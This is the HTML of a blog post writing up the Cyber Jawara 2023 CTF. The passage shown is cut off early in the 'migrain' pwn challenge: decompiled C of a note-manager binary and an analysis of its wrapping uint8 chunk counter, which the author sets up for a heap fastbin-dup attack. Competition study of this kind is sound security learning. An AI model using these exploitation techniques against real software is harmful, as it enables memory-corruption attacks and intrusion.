<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <meta name="robots" content="noodp" />
        <title>Cyber Jawara 2023 Writeup - Chovid99&#39;s Blog</title><meta name="Description" content="Security&#39;s blog made by Chovid99"><meta property="og:title" content="Cyber Jawara 2023 Writeup" />
<meta property="og:description" content="Writeup for Cyber Jawara 2023 by Chovid99" />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://chovid99.github.io/posts/cyber-jawara-2023/" /><meta property="og:image" content="https://chovid99.github.io/C99-web-card.png" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2023-12-03T21:09:30+07:00" />
<meta property="article:modified_time" content="2023-12-04T16:17:44+07:00" /><meta property="og:site_name" content="Welcome to Chovid99&#39;s Blog" />
<meta name="twitter:card" content="summary_large_image" />
<meta name="twitter:image" content="https://chovid99.github.io/C99-web-card.png" /><meta name="twitter:title" content="Cyber Jawara 2023 Writeup"/>
<meta name="twitter:description" content="Writeup for Cyber Jawara 2023 by Chovid99"/>
      <meta name="twitter:site" content="@Chovid99"/>
<meta name="application-name" content="Chovid99&#39;s Blog">
<meta name="apple-mobile-web-app-title" content="Chovid99&#39;s Blog"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://chovid99.github.io/posts/cyber-jawara-2023/" /><link rel="prev" href="https://chovid99.github.io/posts/tcp1p-ctf-2023/" /><link rel="next" href="https://chovid99.github.io/posts/0ctf-tctf-2023/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
        <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
        <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><meta name="google-site-verification" content="9bWYU2tJlhINPHANaxcXkK63aSnxvqj7GHrr_r5tb9s" /><script type="application/ld+json">
    {
        "@context": "http://schema.org",
        "@type": "BlogPosting",
        "headline": "Cyber Jawara 2023 Writeup",
        "inLanguage": "en",
        "mainEntityOfPage": {
            "@type": "WebPage",
            "@id": "https:\/\/chovid99.github.io\/posts\/cyber-jawara-2023\/"
        },"image": ["https:\/\/chovid99.github.io\/C99-web-card.png"],"genre": "posts","keywords": "Writeup, Cyber Jawara, 2023, pwn, heap, tcache, fastbin dup, OOB, ROP, arm32, crypto, web","wordcount":  10326 ,
        "url": "https:\/\/chovid99.github.io\/posts\/cyber-jawara-2023\/","datePublished": "2023-12-03T21:09:30+07:00","dateModified": "2023-12-04T16:17:44+07:00","publisher": {
            "@type": "Organization",
            "name": "Chovid99","logo": "https:\/\/chovid99.github.io\/C99-Black3.png"},"author": {
                "@type": "Person",
                "name": "Chovid99"
            },"description": ""
    }
    </script></head>
    <body data-header-desktop="fixed" data-header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('dark' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'dark' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>

        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
    <div class="header-wrapper">
        <div class="header-title">
            <a href="/" title="Chovid99&#39;s Blog">Chovid99&#39;s Blog</a>
            <a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
                <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
                
                
            </a>
        </div>
        <div class="menu">
            <div class="menu-inner"><a class="menu-item" href="/" title="Check my Home"> Home </a><a class="menu-item" href="/posts/" title="Check my posts"> Posts </a><a class="menu-item" href="/tags/" title="Check my posts&#39; tags"> Tags </a><a class="menu-item" href="/about/" title="Know more about me"> About </a><span class="menu-item delimiter"></span></div>
        </div>
    </div>
</header><header class="mobile" id="header-mobile">
    <div class="header-container">
        <div class="header-wrapper">
            <div class="header-title">
                <a href="/" title="Chovid99&#39;s Blog">Chovid99&#39;s Blog</a>
                <a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
                    <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
                </a>
            </div>
            <div class="menu-toggle" id="menu-toggle-mobile">
                <span></span><span></span><span></span>
            </div>
        </div>
        <div class="menu" id="menu-mobile"><a class="menu-item" href="/" title="Check my Home">Home</a><a class="menu-item" href="/posts/" title="Check my posts">Posts</a><a class="menu-item" href="/tags/" title="Check my posts&#39; tags">Tags</a><a class="menu-item" href="/about/" title="Know more about me">About</a></div>
    </div>
</header><main class="main">
                <div class="container"><div class="toc" id="toc-auto">
            <h2 class="toc-title">Contents</h2>
            <div class="toc-content" id="toc-content-auto"></div>
        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">Cyber Jawara 2023 Writeup</h1><div class="post-meta">
            <div class="post-meta-line">
                </div>
            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="Dec 03, 2023">Dec 03, 2023</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;10326 words&nbsp;
                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;49 minutes&nbsp;</div>
        </div><div class="details toc" id="toc-static"  data-kept="">
                <div class="details-summary toc-title">
                    <span>Contents</span>
                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
                </div>
                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
  <ul>
    <li><a href="#pwn">Pwn</a>
      <ul>
        <li><a href="#migrain">migrain</a>
          <ul>
            <li><a href="#initial-analysis">Initial Analysis</a></li>
            <li><a href="#solution">Solution</a>
              <ul>
                <li><a href="#stage-1-leak-heap--trigger-fastbin-dup">Stage 1: Leak heap &amp; trigger fastbin dup</a></li>
                <li><a href="#stage-2-leak-libc-address">Stage 2: Leak LIBC address</a></li>
                <li><a href="#stage-3-rip-control">Stage 3: RIP Control</a></li>
              </ul>
            </li>
          </ul>
        </li>
        <li><a href="#pinkeye">pinkeye</a>
          <ul>
            <li><a href="#initial-analysis-1">Initial Analysis</a>
              <ul>
                <li><a href="#setup-debugging-environment">Setup Debugging Environment</a></li>
                <li><a href="#blackbox-testing">Blackbox Testing</a></li>
              </ul>
            </li>
            <li><a href="#solution-1">Solution</a>
              <ul>
                <li><a href="#stage-1--stage-2-find-libc-address--pie-base">Stage 1 &amp; Stage 2: Find LIBC address &amp; PIE Base</a></li>
                <li><a href="#stage-3-write-shellcode-to-rwx-region">Stage 3: Write shellcode to <code>RWX</code> region</a></li>
                <li><a href="#stage-4-rip-control">Stage 4: RIP Control</a></li>
              </ul>
            </li>
          </ul>
        </li>
        <li><a href="#sorearm">sorearm</a>
          <ul>
            <li><a href="#initial-analysis-2">Initial Analysis</a></li>
            <li><a href="#solution-2">Solution</a></li>
          </ul>
        </li>
      </ul>
    </li>
    <li><a href="#crypto">Crypto</a>
      <ul>
        <li><a href="#daruma">daruma</a>
          <ul>
            <li><a href="#initial-analysis-3">Initial Analysis</a></li>
            <li><a href="#solution-3">Solution</a></li>
          </ul>
        </li>
        <li><a href="#chokaro">chokaro</a>
          <ul>
            <li><a href="#initial-analysis-4">Initial Analysis</a></li>
            <li><a href="#solution-4">Solution</a></li>
          </ul>
        </li>
      </ul>
    </li>
    <li><a href="#social-media">Social Media</a></li>
  </ul>
</nav></div>
            </div><div class="content" id="content"><p><figure><a class="lightgallery" href="https://i.imgur.com/YLQCfht.png" title="https://i.imgur.com/YLQCfht.png" data-thumbnail="https://i.imgur.com/YLQCfht.png" data-sub-html="<h2>Cyber Jawara 2023</h2>">
        <img
            class="lazyload"
            src="/svg/loading.min.svg"
            data-src="https://i.imgur.com/YLQCfht.png"
            data-srcset="https://i.imgur.com/YLQCfht.png, https://i.imgur.com/YLQCfht.png 1.5x, https://i.imgur.com/YLQCfht.png 2x"
            data-sizes="auto"
            alt="https://i.imgur.com/YLQCfht.png" />
    </a><figcaption class="image-caption">Cyber Jawara 2023</figcaption>
    </figure>
During this weekend, I have been competing in the Cyber Jawara CTF 2023 with my local team, Fidethus. In this writeup, I will be sharing my solutions for some of the challenges that I solved.</p>
<h1 id="pwn">Pwn</h1>
<h2 id="migrain">migrain</h2>
<div class="details admonition quote open">
        <div class="details-summary admonition-title">
            <i class="icon fas fa-quote-right fa-fw" aria-hidden="true"></i>Description<i class="details-icon fas fa-angle-right fa-fw" aria-hidden="true"></i>
        </div>
        <div class="details-content">
            <div class="admonition-content"><p>simple migrain manager, i mean note</p>
<p>137.184.6.25 17001</p>
</div>
        </div>
    </div>
<h3 id="initial-analysis">Initial Analysis</h3>
<p>In this challenge, we were given a binary called <code>migrain</code>. Let&rsquo;s disassemble the binary and take a closer look at some important functions.</p>
<p><strong>main</strong></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">void</span> <span class="kr">__fastcall</span> <span class="n">__noreturn</span> <span class="nf">main</span><span class="p">(</span><span class="kr">__int64</span> <span class="n">a1</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">a2</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">a3</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="n">chunk_struct</span> <span class="n">main_arr</span><span class="p">;</span> <span class="c1">// [rsp+0h] [rbp-650h] BYREF
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">unsigned</span> <span class="kr">__int64</span> <span class="n">v4</span><span class="p">;</span> <span class="c1">// [rsp+648h] [rbp-8h]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">  <span class="n">v4</span> <span class="o">=</span> <span class="nf">__readfsqword</span><span class="p">(</span><span class="mh">0x28u</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nf">pre_setup_17A1</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">  <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;Cyber Jawara 2023: Break this Notes with Infinite Loop&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nf">init_main_arr_1269</span><span class="p">(</span><span class="o">&amp;</span><span class="n">main_arr</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nf">main_func_1496</span><span class="p">(</span><span class="o">&amp;</span><span class="n">main_arr</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>This is the main function, which will call two important functions, <code>init_main_arr_1269</code> and <code>main_func_1496</code>.</p>
<p><strong>init_main_arr_1269</strong></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="k">struct</span> <span class="n">chunk_struct</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="kt">uint8_t</span> <span class="n">count</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="kt">char</span> <span class="o">*</span><span class="n">chunks</span><span class="p">[</span><span class="mi">200</span><span class="p">];</span>
</span></span><span class="line"><span class="cl"><span class="p">};</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">chunk_struct</span> <span class="o">*</span><span class="kr">__fastcall</span> <span class="nf">init_main_arr_1269</span><span class="p">(</span><span class="n">chunk_struct</span> <span class="o">*</span><span class="n">main_arr</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="n">chunk_struct</span> <span class="o">*</span><span class="n">result</span><span class="p">;</span> <span class="c1">// rax
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">unsigned</span> <span class="kr">__int8</span> <span class="n">i</span><span class="p">;</span> <span class="c1">// [rsp+17h] [rbp-1h]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">  <span class="n">result</span> <span class="o">=</span> <span class="n">main_arr</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">main_arr</span><span class="o">-&gt;</span><span class="n">count</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="k">for</span> <span class="p">(</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;=</span> <span class="mh">0xC7u</span><span class="p">;</span> <span class="o">++</span><span class="n">i</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">  <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">main_arr</span><span class="o">-&gt;</span><span class="n">chunks</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0LL</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">result</span> <span class="o">=</span> <span class="p">(</span><span class="n">chunk_struct</span> <span class="o">*</span><span class="p">)((</span><span class="kt">unsigned</span> <span class="kt">int</span><span class="p">)</span><span class="n">i</span> <span class="o">+</span> <span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="n">result</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Ok, so we have a <code>chunk_struct</code>, which keep tracks the <code>count</code> of the total <code>chunks</code>, and it will nullify all the <code>chunks</code> first.</p>
<p><strong>main_func_1496</strong></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">void</span> <span class="kr">__fastcall</span> <span class="n">__noreturn</span> <span class="nf">main_func_1496</span><span class="p">(</span><span class="n">chunk_struct</span> <span class="o">*</span><span class="n">main_arr</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="kt">int</span> <span class="n">v1</span><span class="p">;</span> <span class="c1">// eax
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">  <span class="k">while</span> <span class="p">(</span> <span class="mi">1</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">  <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">v1</span> <span class="o">=</span> <span class="nf">print_menu_152E</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span> <span class="n">v1</span> <span class="o">==</span> <span class="mi">4</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="nf">cleanup_12AA</span><span class="p">((</span><span class="kt">unsigned</span> <span class="kr">__int8</span> <span class="o">*</span><span class="p">)</span><span class="n">main_arr</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">      <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;Exit....&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">      <span class="nf">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span> <span class="n">v1</span> <span class="o">&gt;</span> <span class="mi">4</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">      <span class="k">break</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">switch</span> <span class="p">(</span> <span class="n">v1</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="k">case</span> <span class="mi">3</span><span class="o">:</span>
</span></span><span class="line"><span class="cl">        <span class="nf">destroy_1705</span><span class="p">((</span><span class="kr">__int64</span><span class="p">)</span><span class="n">main_arr</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="k">break</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">      <span class="k">case</span> <span class="mi">1</span><span class="o">:</span>
</span></span><span class="line"><span class="cl">        <span class="nf">add_15FD</span><span class="p">(</span><span class="n">main_arr</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="k">break</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">      <span class="k">case</span> <span class="mi">2</span><span class="o">:</span>
</span></span><span class="line"><span class="cl">        <span class="nf">view_1665</span><span class="p">((</span><span class="kr">__int64</span><span class="p">)</span><span class="n">main_arr</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="k">break</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">      <span class="k">default</span><span class="o">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">goto</span> <span class="n">LABEL_11</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="nl">LABEL_11</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">  <span class="nf">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>This is the real main function, it has 4 menu, which are:</p>
<ul>
<li>add</li>
<li>view</li>
<li>destroy</li>
<li>cleanup (I didn&rsquo;t use this at all, so I won&rsquo;t check this function).</li>
</ul>
<p>Let&rsquo;s try to disassemble it one by one.</p>
<p><strong>add_15FD</strong></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">ssize_t</span> <span class="kr">__fastcall</span> <span class="nf">add_15FD</span><span class="p">(</span><span class="n">chunk_struct</span> <span class="o">*</span><span class="n">main_arr</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="kt">void</span> <span class="o">*</span><span class="n">s</span><span class="p">;</span> <span class="c1">// [rsp+18h] [rbp-8h]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">  <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Payload: &#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="n">s</span> <span class="o">=</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span><span class="nf">alloc_chunk_130D</span><span class="p">(</span><span class="n">main_arr</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nf">memset</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mh">0x64uLL</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="nf">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">s</span><span class="p">,</span> <span class="mh">0x64uLL</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kr">__int64</span> <span class="kr">__fastcall</span> <span class="nf">alloc_chunk_130D</span><span class="p">(</span><span class="n">chunk_struct</span> <span class="o">*</span><span class="n">main_arr</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="kt">uint8_t</span> <span class="n">v1</span><span class="p">;</span> <span class="c1">// al
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">char</span> <span class="o">*</span><span class="n">ptr_to_data</span><span class="p">;</span> <span class="c1">// [rsp+18h] [rbp-8h]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">  <span class="n">ptr_to_data</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="nf">malloc</span><span class="p">(</span><span class="mi">8uLL</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="o">*</span><span class="p">(</span><span class="n">_QWORD</span> <span class="o">*</span><span class="p">)</span><span class="n">ptr_to_data</span> <span class="o">=</span> <span class="nf">malloc</span><span class="p">(</span><span class="mh">0x64uLL</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="n">v1</span> <span class="o">=</span> <span class="n">main_arr</span><span class="o">-&gt;</span><span class="n">count</span><span class="o">++</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">main_arr</span><span class="o">-&gt;</span><span class="n">chunks</span><span class="p">[</span><span class="n">v1</span><span class="p">]</span> <span class="o">=</span> <span class="n">ptr_to_data</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="o">*</span><span class="p">(</span><span class="n">_QWORD</span> <span class="o">*</span><span class="p">)</span><span class="n">ptr_to_data</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>So, this <code>add</code> functions will allocate two chunks (<code>0x8</code> and <code>0x64</code>) size. The smaller chunk will be used to store the pointer to the larger chunk, and the larger chunk will be used to store our <code>payload</code>. There are one interesting thing that we can see here:</p>
<ul>
<li><code>add</code> doesn&rsquo;t have any limit, we can add as many chunks as possible.
<ul>
<li>However, remember that <code>main_arr-&gt;count</code> is actually <code>uint8</code>, so if you add more than the <code>uint8</code> limit, the <code>count</code> will be rest back to <code>0</code>.</li>
</ul>
</li>
</ul>
<p><strong>view_1665</strong></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">unsigned</span> <span class="kr">__int64</span> <span class="kr">__fastcall</span> <span class="nf">view_1665</span><span class="p">(</span><span class="n">chunk_struct</span> <span class="o">*</span><span class="n">main_arr</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">data</span><span class="p">;</span> <span class="c1">// rax
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">int</span> <span class="n">idx</span><span class="p">;</span> <span class="c1">// [rsp+14h] [rbp-Ch] BYREF
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">unsigned</span> <span class="kr">__int64</span> <span class="n">v4</span><span class="p">;</span> <span class="c1">// [rsp+18h] [rbp-8h]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">  <span class="n">v4</span> <span class="o">=</span> <span class="nf">__readfsqword</span><span class="p">(</span><span class="mh">0x28u</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Index: &#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kt">int</span><span class="p">)</span><span class="nf">__isoc99_scanf</span><span class="p">(</span><span class="s">&#34;%d&#34;</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">idx</span><span class="p">)</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="nf">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="n">data</span> <span class="o">=</span> <span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="nf">get_chunk_136B</span><span class="p">(</span><span class="n">main_arr</span><span class="p">,</span> <span class="n">idx</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Data: %s</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">data</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="n">v4</span> <span class="o">-</span> <span class="nf">__readfsqword</span><span class="p">(</span><span class="mh">0x28u</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="kr">__int64</span> <span class="kr">__fastcall</span> <span class="nf">get_chunk_136B</span><span class="p">(</span><span class="n">chunk_struct</span> <span class="o">*</span><span class="n">main_arr</span><span class="p">,</span> <span class="kt">uint8_t</span> <span class="n">idx</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span> <span class="n">idx</span> <span class="o">&gt;=</span> <span class="n">main_arr</span><span class="o">-&gt;</span><span class="n">count</span> <span class="o">||</span> <span class="o">!</span><span class="n">main_arr</span><span class="o">-&gt;</span><span class="n">chunks</span><span class="p">[</span><span class="n">idx</span><span class="p">]</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">  <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;Note index out of range.&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="o">*</span><span class="p">(</span><span class="n">_QWORD</span> <span class="o">*</span><span class="p">)</span><span class="n">main_arr</span><span class="o">-&gt;</span><span class="n">chunks</span><span class="p">[</span><span class="n">idx</span><span class="p">];</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>This <code>view</code> functions will check whether our given <code>idx</code> is:</p>
<ul>
<li>Smaller than the current <code>count</code></li>
<li>Pointing to active chunk
After this validation, it will return to use the contents of the chunk.</li>
</ul>
<p><strong>destroy_1705</strong></p>
<div class="highlight"><div class="chroma">
